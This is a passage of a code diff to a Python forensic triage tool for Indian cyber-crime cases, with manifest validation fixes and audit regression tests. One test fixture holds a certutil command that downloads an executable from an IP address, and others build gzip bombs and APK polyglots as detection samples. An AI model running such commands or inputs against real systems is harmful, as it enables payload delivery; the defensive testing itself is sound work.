@@ -2331,7 +2882,7 @@ class SutraNeuralTriageOrchestrator:
                             "mitre": None, "details": res,
                             "ref": evidence_ref(aid, 0, tr["length"], session_id=sid), "statutory": statutory})
         for aid in by_kind["image_pgm"]:
-            img = guarded(aid, lambda a: parse_pgm(self._load(a)), aid)
+            img = guarded(aid, lambda a: parse_pgm(self._load(a), crop=self.media_engine.MAX_DCT_DIM), aid)
             if img is None:
                 continue
             px, start = img
@@ -2367,20 +2918,26 @@ class SutraNeuralTriageOrchestrator:
                 r["_artifact"] = aid
             upi_rows.extend(rows)
             scanned += len(rows)
-        for r in upi_rows:
-            v = self.fin_engine.validate_rrn(r.get("rrn", ""), r["epoch"])
-            if not v["valid"]:
+        for r in upi_rows:   # one row can never abort the case; a naive (zone-less) time is also tried as IST
+            v = guarded(r["_artifact"], self.fin_engine.validate_rrn, r.get("rrn", ""), r["epoch"], bool(r.get("tz_naive")))
+            if v is not None and not v["valid"]:
                 raw.append({"family": "FIN", "category": "INVALID_NPCI_RRN", "score": 0.55, "mitre": None,
                             "details": {"transaction": _txn_view(r), "rrn_validation": v}, "ref": row_ref(r)})
         for alert in guarded("upi_csv", self.fin_engine.detect_smurfing, upi_rows) or []:
             rows = alert.pop("rows")
             notice = self.fin_engine.build_freeze_notice(self.case_id, alert)
             xml = self.fin_engine.build_fiu_str_xml(self.case_id, alert)
+            xml_problems = str_xml_check(xml)
             raw.append({"family": "FIN", "category": "RAPID_UPI_SMURFING", "score": alert["threat_score"],
                         "mitre": None, "details": alert, "ref": row_ref(rows[0]),
                         "extra_refs": {"row_anchors": [row_ref(r) for r in rows]},
-                        "statutory": {"bnss_sec_106_freeze_ready": notice["fields_complete"],
-                                      "fiu_ind_str_xml_ready": True, "flagged_mules": alert["flagged_mules"],
+                        # B's notice is a gross-credit triage view; the freeze notice to serve is Sector D's
+                        "statutory": {"bnss_sec_106_freeze_ready": False,
+                                      "bnss_sec_106_freeze_notice_status": notice["notice_status"],
+                                      "bnss_sec_106_fields_complete": notice["fields_complete"],
+                                      "fiu_ind_str_xml_ready": not xml_problems,
+                                      "fiu_ind_str_xml_problems": xml_problems,
+                                      "flagged_mules": alert["flagged_mules"],
                                       "freeze_notice": notice, "fiu_ind_str_xml": xml}})
         chain_rows: List[Dict[str, Any]] = []
         for aid in by_kind["chain_csv"]:
@@ -2510,7 +3067,46 @@ class SutraNeuralTriageOrchestrator:
                 lead["mitre_technique"] = l["mitre"]
             if l.get("statutory"):
                 lead["statutory_actions"] = l["statutory"]
+            try:   # belt and braces: a value canonical JSON cannot carry drops this lead, not the manifest
+                canonical_json(lead)
+            except (ValueError, TypeError, UnicodeEncodeError, RecursionError) as exc:
+                errors.append({"artifact_id": l["ref"]["artifact_id"],
+                               "error": f"lead not serialisable: {type(exc).__name__}: {exc}"[:300]})
+                continue
+            if l.get("s45_target") and exculpatory:
+                exculpatory["evaluated_for_lead_id"] = lead["lead_id"]
+                exculpatory["evaluated_for_lead_offset"] = anchor["byte_offset"]
+                exculpatory["evaluated_for_anchor"] = {k: anchor[k] for k in (
+                    "artifact_id", "file_path", "offset_basis", "byte_offset", "length", "sha256") if k in anchor}
             leads.append(lead)
+        if exculpatory:
+            try:
+                canonical_json(exculpatory)
+            except (ValueError, TypeError, UnicodeEncodeError, RecursionError) as exc:
+                errors.append({"artifact_id": exculpatory.get("evaluated_for_lead_artifact_id") or "",
+                               "error": f"Section 45 checklist not serialisable: {type(exc).__name__}: {exc}"[:300]})
+                exculpatory = None
+
+        artifacts_out = []
+        for aid, a in sorted(self.artifacts.items()):
+            entry = {"artifact_id": aid, "kind": a["kind"], "source_type": a["source_type"],
+                     "byte_offset": a["base"], "length": a["length"]}
+            if a["path"] is not None:
+                entry["file_path"] = a["meta"].get("display_path") or a["path"]
+                entry["offset_basis"] = "ABSOLUTE_IN_FILE" if a["base"] or a["meta"].get("extent") else "FILE"
+            else:
+                entry["offset_basis"] = "ARTIFACT"
+            status = unavailable.get(aid)
+            sha = None
+            if status is None:
+                try:
+                    sha = self._artifact_sha256(a)
+                    status = "OK"
+                except (OSError, ValueError) as exc:
+                    status = "TRUNCATED" if isinstance(exc, ValueError) else "UNREADABLE"
+                    errors.append({"artifact_id": aid, "error": f"{status}: artifact not hashed: {exc}"[:300]})
+            entry.update(sha256=sha, status=status)
+            artifacts_out.append(entry)
 
         ts = triage_time_utc or iso_utc(time.time())
         manifest: Dict[str, Any] = {
@@ -2526,16 +3122,17 @@ class SutraNeuralTriageOrchestrator:
                 "exculpatory_checks_evaluated": exculpatory["checks_evaluated"] if exculpatory else 0,
                 "trojan_defense_probability": exculpatory["trojan_defense_probability"] if exculpatory else None,
             },
-            "artifacts": [{"artifact_id": aid, "kind": a["kind"], "source_type": a["source_type"],
-                           "byte_offset": a["base"], "length": a["length"], "sha256": self._artifact_sha256(a)}
-                          for aid, a in sorted(self.artifacts.items())],
+            "artifacts": artifacts_out,
             "artifact_errors": errors,
             "symbolic_anchors": leads,
             "section45_exculpatory_checklist": exculpatory,
             "engine_runtime": {"revision": TRIAGE_REVISION, "python": sys.version.split()[0], "numpy": _np is not None,
                                "onnxruntime": _ort is not None,
                                "neural_prefilter_attached": self.media_engine.onnx_session is not None,
-                               "sector_a_module": getattr(_sector_a, "VAULT_VERSION", None)},
+                               "sector_a_module": getattr(_sector_a, "VAULT_VERSION", None),
+                               # device-local offset used for WhatsApp/AnyDesk times, so Sector C can refuse
+                               # to re-interpret local strings with a different zone
+                               "log_utc_offset_minutes": self.log_utc_offset_minutes},
         }
         manifest["manifest_sha256"] = _sha256_hex(canonical_json(manifest))
         self._cache = {}
@@ -2549,7 +3146,20 @@ class SutraNeuralTriageOrchestrator:
 
 
 def validate_manifest(m: Dict[str, Any]) -> List[str]:
-    """Schema check for triage_manifest.json; returns a list of problems (empty when valid)."""
+    """
+    Schema check for triage_manifest.json; returns a list of problems (empty when valid). Never raises:
+    a tampered manifest with wrong types (null lead, string score, NaN, dict instead of list) is
+    reported as problems, so Sector C says "failed validation" instead of showing a traceback.
+    """
+    try:
+        return _validate_manifest(m)
+    except Exception as exc:  # pragma: no cover - last resort; _validate_manifest type-checks everything
+        return [f"manifest malformed: {type(exc).__name__}: {exc}"[:300]]
+
+
+def _validate_manifest(m: Any) -> List[str]:
+    if not isinstance(m, dict):
+        return ["manifest is not a JSON object"]
     errs = []
     for k in ("version", "case_id", "triage_timestamp_utc", "summary_metrics", "symbolic_anchors", "manifest_sha256"):
         if k not in m:
@@ -2558,30 +3168,52 @@ def validate_manifest(m: Dict[str, Any]) -> List[str]:
         return errs
     if m["version"] != TRIAGE_VERSION:
         errs.append("version mismatch")
-    if not re.fullmatch(r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z", m["triage_timestamp_utc"]):
+    if not (isinstance(m["triage_timestamp_utc"], str)
+            and re.fullmatch(r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z", m["triage_timestamp_utc"])):
         errs.append("triage_timestamp_utc not ISO-8601 UTC with milliseconds")
-    for k in ("total_telemetry_events_scanned", "high_priority_leads_flagged", "exculpatory_checks_evaluated",
-              "trojan_defense_probability"):
-        if k not in m["summary_metrics"]:
-            errs.append(f"summary_metrics.{k} missing")
+    sm = m["summary_metrics"]
+    if not isinstance(sm, dict):
+        errs.append("summary_metrics is not an object")
+    else:
+        for k in ("total_telemetry_events_scanned", "high_priority_leads_flagged", "exculpatory_checks_evaluated",
+                  "trojan_defense_probability"):
+            if k not in sm:
+                errs.append(f"summary_metrics.{k} missing")
+    leads = m["symbolic_anchors"]
+    if not isinstance(leads, list):
+        errs.append("symbolic_anchors is not a list")
+        leads = []
     ids = set()
-    for lead in m["symbolic_anchors"]:
+    for n, lead in enumerate(leads):
+        if not isinstance(lead, dict):
+            errs.append(f"symbolic_anchors[{n}] is not an object")
+            continue
         lid = lead.get("lead_id", "")
-        if not re.fullmatch(r"LEAD-B-(LOG|MEDIA|FIN|APK)-\d{3}", lid) or lid in ids:
+        if not isinstance(lid, str) or not re.fullmatch(r"LEAD-B-(LOG|MEDIA|FIN|APK)-\d{3}", lid) or lid in ids:
             errs.append(f"bad lead_id {lid!r}")
-        ids.add(lid)
+        if isinstance(lid, str):
+            ids.add(lid)
         for k in ("threat_category", "severity", "threat_score", "symbolic_anchor", "lead_details"):
             if k not in lead:
                 errs.append(f"{lid}: missing {k}")
         a = lead.get("symbolic_anchor", {})
-        if not (isinstance(a.get("byte_offset"), int) and a["byte_offset"] >= 0 and isinstance(a.get("length"), int)
+        if not (isinstance(a, dict) and isinstance(a.get("byte_offset"), int) and not isinstance(a["byte_offset"], bool)
+                and a["byte_offset"] >= 0 and isinstance(a.get("length"), int) and not isinstance(a["length"], bool)
                 and a["length"] > 0 and re.fullmatch(r"[0-9a-f]{64}", str(a.get("sha256"))) and a.get("source_type")):
             errs.append(f"{lid}: incomplete symbolic anchor")
-        if lead.get("severity") != severity_for(lead.get("threat_score", 0)):
+        score = lead.get("threat_score", 0)
+        if isinstance(score, bool) or not isinstance(score, (int, float)) or not math.isfinite(score):
+            errs.append(f"{lid}: bad threat_score {score!r}"[:120])
+        elif lead.get("severity") != severity_for(score):
             errs.append(f"{lid}: severity inconsistent with score")
     body = {k: v for k, v in m.items() if k != "manifest_sha256"}
-    if _sha256_hex(canonical_json(body)) != m["manifest_sha256"]:
-        errs.append("manifest_sha256 does not match content")
+    try:
+        digest = _sha256_hex(canonical_json(body))
+    except (ValueError, TypeError, UnicodeEncodeError, RecursionError):
+        errs.append("manifest not canonical-JSON serialisable")
+    else:
+        if digest != m["manifest_sha256"]:
+            errs.append("manifest_sha256 does not match content")
     return errs
 
 
@@ -2963,6 +3595,505 @@ def _audit_regressions(workdir: str) -> List[Tuple[str, bool]]:
     return out
 
 
+def _safe_console(*streams: Any) -> None:
+    """
+    Console output can never abort the self-test: a stream whose encoding is not UTF-8 (a cp1252 /
+    cp437 Windows console, output redirected to a file under a legacy code page, PYTHONIOENCODING=ascii)
+    writes characters it cannot encode as backslash escapes instead of raising UnicodeEncodeError.
+    """
+    for s in streams or (sys.stdout, sys.stderr):
+        if s is None or not hasattr(s, "reconfigure"):
+            continue
+        try:
+            if codecs.lookup(getattr(s, "encoding", None) or "ascii").name == "utf-8":
+                continue
+        except LookupError:
+            pass
+        try:
+            s.reconfigure(errors="backslashreplace")
+        except (ValueError, OSError, AttributeError):
+            pass
+
+
+def _overnight_regressions(workdir: str, image: str, layout: Dict[str, Tuple[int, int]],
+                           a_manifest_path: Optional[str]) -> List[Tuple[str, bool]]:
+    """
+    One check per finding of the 2026-10-21 overnight audit (B-F01 .. B-F26 and the cross-sector
+    B-* items; B-01 is checked with B-F21 and B-S45-01 with B-F23), plus console safety. A check that
+    raises counts as failed, so this group also runs (and fails) against the unfixed module.
+    """
+    out: List[Tuple[str, bool]] = []
+    rdir = os.path.join(workdir, "overnight")
+    os.makedirs(rdir, exist_ok=True)
+    case = "FIR-042/2026-CYBER"
+    hdr = "txn_id,rrn,timestamp_utc,payer_vpa,payee_vpa,amount_inr,payee_ifsc\n"
+    bundle = _build_case_bundle()
+    V = SutraNeuralTriageOrchestrator.verify_anchor
+
+    def check(name: str, fn: Any) -> None:
+        try:
+            res = fn()
+            ok, detail = res if isinstance(res, tuple) else (res, "")
+            ok = bool(ok)
+        except Exception as exc:  # a regression that raises is a failed check, not a crashed self-test
+            ok, detail = False, f"raised {type(exc).__name__}: {exc}"[:160]
+        out.append((name, ok))
+        print(f"  [{'PASS' if ok else 'FAIL'}] O{len(out):02d} {name}" + (f"  ({detail})" if detail else ""))
+
+    def run_data(owner: Optional[str] = "rahul", **arts: Tuple[str, bytes]) -> Dict[str, Any]:
+        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir, device_owner=owner)
+        for aid, (kind, data) in arts.items():
+            o.add_artifact(aid, kind, "TEST_" + kind.upper(), data=data)
+        m = o.run(write=False)
+        canonical_json(m)   # the manifest must always be hashable
+        return m
+
+    def cats(m: Dict[str, Any]) -> List[str]:
+        return sorted(l["threat_category"] for l in m["symbolic_anchors"])
+
+    def lead(m: Dict[str, Any], cat: str) -> Dict[str, Any]:
+        return next(l for l in m["symbolic_anchors"] if l["threat_category"] == cat)
+
+    def peak_bytes(fn: Any) -> Tuple[Any, int]:
+        tracemalloc.start()
+        try:
+            res = fn()
+            return res, tracemalloc.get_traced_memory()[1]
+        finally:
+            tracemalloc.stop()
+
+    print("\nOvernight audit regressions")
+
+    def f01():   # year-9999 UPI rows
+        got = []
+        for ts in ("9999-12-31T20:00:00Z", "9999-06-01T00:00:00Z"):
+            m = run_data(upi=("upi_csv", (hdr + "T1,628711000101,2026-10-14T06:15:00Z,a@ybl,b@ybl,100,YESB0000001\n"
+                                          f"T2,028711000102,{ts},a@ybl,c@ybl,100,YESB0000001\n").encode()))
+            got.append(cats(m))
+        v = FinancialMuleDetector().validate_rrn("028711000102", parse_timestamp("9999-06-01T00:00:00Z"))
+        return got == [["INVALID_NPCI_RRN"]] * 2 and v["valid"] is False, f"{got}, {v['reasons'][:1]}"
+    check("B-F01 UPI rows dated in year 9999 give an RRN finding, not a crashed run", f01)
+
+    def f02():   # year-0001 WhatsApp line
+        line = (b"0001-01-01 05:30:00.000 LL_I voip/ice: remote candidate: candidate:8 1 udp 1677729535 "
+                b"49.36.121.77 3478 typ srflx\n")
+        m = run_data(wa=("whatsapp_log", line))
+        st = lead(m, "WEBRTC_PEER_ENDPOINT")["statutory_actions"]
+        y1 = iso_utc(-62135596800.0)
+        return (y1 == "0001-01-01T00:00:00.000Z" and st["requisition"]["query_window_utc"] is None
+                and st["bnss_sec_94_requisition_ready"] is False), f"iso_utc(year 1) = {y1}"
+    check("B-F02 a year-0001 WhatsApp line: 4-digit ISO year, Sec 94 window None, no crash", f02)
+
+    def f03():   # NaN / Infinity / 1e999 / lone surrogate in JSONL
+        cmd = '"command_line":"certutil.exe -urlcache -split -f http://185.220.101.5/a.exe a{}.exe"'
+        base = '{{"event_id":1,"timestamp":{},"image":"certutil.exe",' + cmd + '{}}}'
+        lines = [base.format('"2026-10-14T06:10:05Z"', "", ',"logon_type":NaN'),
+                 base.format("1e999", "", ""),
+                 base.format('"2026-10-14T06:10:06Z"', "", ',"host":Infinity'),
+                 base.format('"2026-10-14T06:10:07Z"', "\\ud800", "")]
+        m = run_data(ev=("process_events_jsonl", ("\n".join(lines) + "\n").encode()))
+        n_err = len(m["artifact_errors"])
+        return n_err == 3 and cats(m) == ["LOLBINS_COMMAND"], f"{n_err} non-finite lines reported, surrogate line kept"
+    check("B-F03 NaN/Infinity/1e999/lone surrogate in JSONL are reported, manifest still hashes", f03)
+
+    def f04():   # registered file missing at run time
+        d = os.path.join(rdir, "f04")
+        os.makedirs(d, exist_ok=True)
+        p_chat, p_upi = os.path.join(d, "chat.txt"), os.path.join(d, "upi.csv")
+        for p, k in ((p_chat, "chat"), (p_upi, "upi")):
+            with open(p, "wb") as f:
+                f.write(bundle[k])
+        o = SutraNeuralTriageOrchestrator(case, output_dir=d)
+        o.add_artifact("chat", "chat_transcript", "CHAT", path=p_chat)
+        o.add_artifact("upi", "upi_csv", "UPI", path=p_upi)
+        os.remove(p_chat)
+        m = o.run(write=False)
+        arts = {a["artifact_id"]: a for a in m["artifacts"]}
+        return (arts["chat"].get("sha256") is None and arts["chat"].get("status") == "UNREADABLE"
+                and arts["upi"].get("status") == "OK" and "RAPID_UPI_SMURFING" in cats(m)
+                and any(e["artifact_id"] == "chat" and e["error"].startswith("UNREADABLE") for e in m["artifact_errors"]))
+    check("B-F04 a registered file deleted before run(): UNREADABLE tripwire, manifest still written", f04)
+
+    def f05():   # extents validated, truncation is a tripwire
+        p = os.path.join(rdir, "f05.img")
+        with open(p, "wb") as f:
+            f.write(bundle["apk"] + bytes(100))
+        size = os.path.getsize(p)
+        rejected = []
+        for bo, ln in ((0, size + 1), (0, -1), (size + 10, None), (-5, 10)):
+            try:
+                SutraNeuralTriageOrchestrator(case, output_dir=rdir).add_artifact(
+                    "x", "apk", "APK", path=p, base_offset=bo, length=ln)
+                rejected.append(False)
+            except ValueError:
+                rejected.append(True)
+        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir)
+        o.add_artifact("apk", "apk", "ANDROID_APK_FILE", path=p, base_offset=0, length=len(bundle["apk"]))
+        with open(p, "r+b") as f:
+            f.truncate(100)
+        m = o.run(write=False)
+        a = m["artifacts"][0]
+        return (all(rejected) and a.get("sha256") is None and a.get("status") == "TRUNCATED" and not m["symbolic_anchors"]
+                and any("TRUNCATED" in e["error"] for e in m["artifact_errors"])), f"bad extents rejected {rejected}"
+    check("B-F05 out-of-file / negative extents rejected; a truncated image is TRUNCATED, not re-hashed short", f05)
+
+    def f06():   # msgstore.db URI with '#', '%' and a UNC-style path
+        d = os.path.join(rdir, "FIR #42 50%")
+        os.makedirs(d, exist_ok=True)
+        db = os.path.join(d, "msgstore.db")
+        if os.path.exists(db):
+            os.remove(db)
+        con = sqlite3.connect(db)
+        con.execute("CREATE TABLE call_log (_id INTEGER, call_id TEXT, timestamp INTEGER, duration INTEGER)")
+        con.execute("INSERT INTO call_log VALUES (1, 'wrtc_call_99182', 1792000000000, 600)")
+        con.commit()
+        con.close()
+        before = sorted(os.listdir(rdir))
+        rows = DeepfakeTriageEngine.parse_msgstore_calls(db)
+        if os.name == "nt":
+            unc = DeepfakeTriageEngine.msgstore_uri("\\\\nas\\cases\\FIR #42\\msgstore.db") == \
+                "file:////nas/cases/FIR%20%2342/msgstore.db?mode=ro&immutable=1"
+        else:
+            unc = len(DeepfakeTriageEngine.parse_msgstore_calls("/" + os.path.abspath(db))) == 1
+        return ([r.get("call_id") for r in rows] == ["wrtc_call_99182"] and unc
+                and sorted(os.listdir(rdir)) == before), "no stray database created"
+    check("B-F06 msgstore.db in 'FIR #42 50%' opens read-only (percent-encoded URI); UNC-style path works", f06)
+
+    def f07():   # one out-of-range row must not discard the export
+        m = run_data(upi=("upi_csv", bundle["upi"] + b"T8,628711000108,9999-12-31T23:59:59-05:00,x@ybl,y@ybl,10.00,"
+                                                    b"YESB0000001\n"))
+        errs = [e["error"] for e in m["artifact_errors"]]
+        return "RAPID_UPI_SMURFING" in cats(m) and len(errs) == 1, errs[0] if errs else "no error"
+    check("B-F07 one year-10000 UPI row is one row error; the rest of the export keeps its leads", f07)
+
+    def f08():   # non-string Image / ParentImage, deep nesting
+        ev = bundle["events"]
+        bad = [json.dumps({"event_id": 1, "timestamp": "2026-10-14T06:09:00Z", "command_line": "whoami", "image": 4242}),
+               json.dumps({"event_id": 1, "timestamp": "2026-10-14T06:09:01Z", "command_line": "whoami",
+                           "ParentImage": {"x": 1}}),
+               json.dumps({"event_id": 4624, "timestamp": "2026-10-14T06:00:00Z", "logon_type": 3, "image": ["a"]}),
+               "[" * 200000]
+        m = run_data(ev=("process_events_jsonl", ev + ("\n".join(bad) + "\n").encode()))
+        n_log, n_s45 = cats(m).count("LOLBINS_COMMAND"), m["summary_metrics"]["exculpatory_checks_evaluated"]
+        return (n_log == 2 and n_s45 == 14 and len(m["artifact_errors"]) == 1), \
+            f"{n_log} log leads, {n_s45} Sec 45 checks, {len(m['artifact_errors'])} error(s)"
+    check("B-F08 events with numeric/list/object Image fields keep the log's leads and the Sec 45 screen", f08)
+
+    def f09():   # one flipped bit in a JSONL line is reported
+        ev = bytearray(bundle["events"])
+        i = ev.rstrip(b"\n").rindex(b"\n") + 1
+        ev[i] ^= 1
+        m = run_data(ev=("process_events_jsonl", bytes(ev)))
+        errs = [e["error"] for e in m["artifact_errors"]]
+        return any(f"byte {i}" in e for e in errs), errs[0] if errs else "no error recorded"
+    check("B-F09 a corrupted JSONL line is listed in artifact_errors, not silently dropped", f09)
+
+    def f10():   # BOM-marked UTF-8 and UTF-16LE exports
+        ev = bundle["events"]
+        res = []
+        for data in (ev, b"\xef\xbb\xbf" + ev, b"\xff\xfe" + ev.decode().encode("utf-16-le")):
+            m = run_data(ev=("process_events_jsonl", data))
+            res.append((cats(m), m["summary_metrics"]["total_telemetry_events_scanned"],
+                        all(V(l["symbolic_anchor"], data) for l in m["symbolic_anchors"])))
+        br = bundle["bugreport"]
+        dump = br[br.index(b"Packages:"):br.index(b"------ DUMP OF SERVICE settings")]
+        md = run_data(d=("dumpsys_package", b"\xff\xfe" + dump.decode().encode("utf-16-le")))
+        return (res[0] == res[1] == res[2] and res[0][1] == 4 and res[0][2]
+                and cats(md).count("ANDROID_TROJAN_CAPABILITY") == 2), \
+            f"events scanned UTF-8/BOM/UTF-16LE {[r[1] for r in res]}, anchors re-hash {[r[2] for r in res]}"
+    check("B-F10 UTF-8-BOM and UTF-16LE (PowerShell 5.1) exports parse with exact anchors", f10)
+
+    def f11():   # Sector A binding is verified
+        if _sector_a is None or not a_manifest_path:
+            return True, "Sector A not beside this file: binding left UNVERIFIED by design"
+        with open(a_manifest_path, "r", encoding="utf-8") as f:
+            am = json.load(f)
+        bad = json.loads(json.dumps(am))
+        bad["cryptographic_hashes"]["sha256_linear_primary"] = "0" * 64
+        try:
+            SutraNeuralTriageOrchestrator(case, output_dir=rdir).bind_sector_a_manifest(bad)
+            refused = False
+        except ValueError:
+            refused = True
+        d = os.path.join(rdir, "f11")
+        os.makedirs(d, exist_ok=True)
+        flipped = os.path.join(d, os.path.basename(image))
+        with open(image, "rb") as f:
+            blob = bytearray(f.read())
+        i = blob.index(b"34K 712946")
+        blob[i + 4] ^= 1     # '7' -> '6': one bit flipped after Sector A vaulted the image
+        with open(flipped, "wb") as f:
+            f.write(blob)
+        got = []
+        for src in (image, flipped):
+            o = SutraNeuralTriageOrchestrator(case, output_dir=d)
+            o.bind_sector_a_manifest(a_manifest_path)
+            off, ln = layout["chat"]
+            o.add_artifact("chat", "chat_transcript", "CHAT_TRANSCRIPT_TEXT", path=src, base_offset=off, length=ln,
+                           extent=True)
+            m = o.run(write=False)
+            got.append((m["sector_a_binding"].get("manifest_digest"), m["sector_a_binding"].get("image_digest"),
+                        any(e["error"].startswith("INTEGRITY_FAILURE") for e in m["artifact_errors"])))
+        return (refused and got[0] == ("VERIFIED", "VERIFIED", False)
+                and got[1] == ("VERIFIED", "MISMATCH", True)), f"edited A manifest refused: {refused}; {got}"
+    check("B-F11 edited Sector A manifest refused; image bit-flip after vaulting is an INTEGRITY_FAILURE", f11)
+
+    def f12():   # naive-IST bank timestamps and RRN validation
+        def rrn_cats(col: str, rrn: str, ts: str) -> List[str]:
+            csv_ = f"txn_id,rrn,{col},payer_vpa,payee_vpa,amount_inr,payee_ifsc\nT1,{rrn},{ts},r@okhdfc,s@ybl,2500,YESB0000001\n"
+            return cats(run_data(upi=("upi_csv", csv_.encode())))
+        genuine = [rrn_cats("timestamp", "628711000101", "2026-10-14 11:45:00"),
+                   rrn_cats("timestamp_utc", "628711000101", "2026-10-14 11:45:00"),
+                   rrn_cats("timestamp_utc", "628711000101", "2026-10-14T06:15:00Z")]
+        wrong_hour = rrn_cats("timestamp", "628702000101", "2026-10-14 11:45:00")
+        return genuine == [[], [], []] and wrong_hour == ["INVALID_NPCI_RRN"], f"genuine {genuine}, wrong hour {wrong_hour}"
+    check("B-F12 genuine RRNs in naive-IST exports are valid; a wrong RRN hour is still flagged", f12)
+
+    def f13():   # '+0530' basic-format offsets, identical on 3.10 and 3.11+
+        lines = bundle["upi"].decode().splitlines()
+        rows = [lines[0]]
+        for ln in lines[1:]:
+            f_ = ln.split(",")
+            local = _utc_like(parse_timestamp(f_[2]) + 19800)
+            f_[2] = local + "+0530"
+            rows.append(",".join(f_))
+        m = run_data(upi=("upi_csv", ("\n".join(rows) + "\n").encode()))
+        same = parse_timestamp("2026-10-14T11:45:00+0530") == parse_timestamp("2026-10-14T06:15:00Z") == \
+            parse_timestamp("2026-10-14T06:15:00.000-0000")
+        return same and "RAPID_UPI_SMURFING" in cats(m) and not m["artifact_errors"], f"Python {sys.version.split()[0]}"
+    check("B-F13 '+0530' offsets parse (Python 3.10 too), so the VM and Windows agree", f13)
+
+    def f14():   # decode_text_with_offsets memory
+        text = ("[14/10/26 12:05] Handler: payment done \u20b9 500, ok \U0001F44D\n" * 20000) + "note 34K 712946\n"
+        data = text.encode()
+        (txt, to_byte), peak = peak_bytes(lambda: decode_text_with_offsets(data))
+        idx = [0, 1, 37, 4095, 70001, len(txt) - 5, len(txt)]
+        exact = all(to_byte(i) == len(txt[:i].encode("utf-8")) for i in idx)
+        tok = FinancialMuleDetector.extract_hawala_tokens(data)
+        return (peak < 10 * len(data) and exact and len(tok) == 1
+                and data[tok[0]["byte_offset"]:tok[0]["byte_offset"] + tok[0]["length"]] == b"34K 712946"), \
+            f"peak {peak / len(data):.1f}x a {len(data) >> 10} KB emoji chat"
+    check("B-F14 emoji chat export: offset map no longer costs a Python int per character", f14)
+
+    def f15():   # whole-artifact parsing memory
+        data = (b"x" * 63 + b"\n") * (128 * 1024)                    # 8 MB of lines
+        _, peak = peak_bytes(lambda: next(iter_lines(data)))
+        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir)
+        o.add_artifact("a", "chat_transcript", "T", data=b"a" * 10)
+        o.add_artifact("b", "chat_transcript", "T", data=b"b" * 10)
+        o._cache = {}
+        o._load("a")
+        o._load("b")
+        return (peak < len(data) // 8 and list(o._cache) == ["b"] and o.MAX_INMEMORY_BYTES <= 64 * 1024 * 1024), \
+            f"first line of 8 MB: {peak} B; cap {o.MAX_INMEMORY_BYTES >> 20} MB; one artifact cached"
+    check("B-F15 lines are read lazily, one artifact cached at a time, parse cap within the RAM budget", f15)
+
+    def f16():   # gzip bomb
+        media = DeepfakeTriageEngine()
+        media.MAX_LOG_BYTES = cap = 4 * 1024 * 1024
+        raw = gzip.compress(b"A" * (3 * cap), 6)
+        parsed, peak = peak_bytes(lambda: media.parse_whatsapp_log(raw))
+        return (parsed["errors"] and peak < 3 * cap and DeepfakeTriageEngine.MAX_LOG_BYTES <= 64 * 1024 * 1024), \
+            f"peak {peak / cap:.2f}x the decompression cap ({DeepfakeTriageEngine.MAX_LOG_BYTES >> 20} MB)"
+    check("B-F16 whatsapp.log.gz bomb: no second copy of the text, 64 MB decompression cap", f16)
+
+    def f17():   # PGM with a zero dimension
+        def go():
+            try:
+                parse_pgm(b"P5\n0 1000000\n255\n")
+                return False
+            except ValueError:
+                return True
+        raised, peak = peak_bytes(go)
+        return raised and peak < 1024 * 1024, f"rejected, peak {peak >> 10} KB"
+    check("B-F17 18-byte PGM declaring 0 x 1,000,000 pixels is rejected before allocating", f17)
+
+    def f18():   # backtracking regexes
+        t = time.perf_counter()
+        try:
+            parse_pgm(b"P5 " + b"# " * 24 + b"x")
+        except ValueError:
+            pass
+        t_pgm = time.perf_counter() - t
+        xml = b'<?xml version="1.0"?><packages><!-- ' + b"<package " * 5000 + b' --><package name="a.b" /></packages>'
+        t = time.perf_counter()
+        pk = AndroidTrojanTriageEngine.parse_packages_xml(xml)
+        t_xml = time.perf_counter() - t
+        return t_pgm < 0.25 and t_xml < 0.5 and list(pk) == ["a.b"], f"PGM {t_pgm:.3f}s, packages.xml {t_xml:.3f}s"
+    check("B-F18 PGM '# # # ...' header and a 45 KB commented packages.xml parse in linear time", f18)
+
+    def f19():   # APK polyglots beyond HEAD_SCAN and concatenated archives
+        apk_ = _synthetic_apk()
+        names = lambda r: {f_["finding"] for f_ in r["findings"]}  # noqa: E731
+        big = AndroidTrojanTriageEngine.analyze_apk_bytes(b"\xff\xd8\xff\xe0" + bytes(5 * 1024 * 1024) + b"\xff\xd9" + apk_)
+        pay = io.BytesIO()
+        with zipfile.ZipFile(pay, "w", zipfile.ZIP_STORED) as zf:
+            zf.writestr("payload.dex", b"dex\n035\x00" + bytes(64))
+        cat = AndroidTrojanTriageEngine.analyze_apk_bytes(apk_ + pay.getvalue())
+        e = apk_.rfind(b"PK\x05\x06")          # same clean APK, central directory listed in reverse order
+        cd_size, cd_off = struct.unpack_from("<II", apk_, e + 12)
+        cd, ents, p = apk_[cd_off:cd_off + cd_size], [], 0
+        while p < len(cd):
+            n_, m_, k_ = struct.unpack_from("<HHH", cd, p + 28)
+            ents.append(cd[p:p + 46 + n_ + m_ + k_])
+            p += 46 + n_ + m_ + k_
+        rev = apk_[:cd_off] + b"".join(reversed(ents)) + apk_[cd_off + cd_size:]
+        clean = AndroidTrojanTriageEngine.analyze_apk_bytes(rev)
+        return ("JPEG_ZIP_POLYGLOT" in names(big) and "CONCATENATED_ZIP" in names(cat) and clean["findings"] == []
+                and big["threat_score"] >= 0.85), f"{sorted(names(big))} {sorted(names(cat))}, reordered CD clean"
+    check("B-F19 5 MB JPEG prefix and an appended ZIP are flagged; a reordered central directory is not", f19)
+
+    def f20():   # verify_anchor bounds
+        data = b"0123456789abcdefghij"
+        p = os.path.join(rdir, "anchor.bin")
+        with open(p, "wb") as f:
+            f.write(data)
+        zero = {"byte_offset": 999, "length": 0, "sha256": _sha256_hex(b"")}
+        neg = {"byte_offset": -8, "length": 8, "sha256": _sha256_hex(data[-8:])}
+        good = {"byte_offset": 2, "length": 5, "sha256": _sha256_hex(data[2:7])}
+        got = [V(zero, data), V(zero, p), V(neg, data), V(neg, p), V({"byte_offset": 2}, p), V(good, data), V(good, p)]
+        return got == [False] * 5 + [True, True], str(got)
+    check("B-F20 verify_anchor rejects zero-length, negative and malformed anchors without raising", f20)
+
+    def f21():   # validate_manifest never raises (B-01: string threat_score)
+        m = run_data(ev=("process_events_jsonl", bundle["events"]))
+        muts = [lambda d: d["symbolic_anchors"].__setitem__(0, None),
+                lambda d: d["symbolic_anchors"][0].__setitem__("symbolic_anchor", None),
+                lambda d: d["symbolic_anchors"][0].__setitem__("threat_score", "high"),
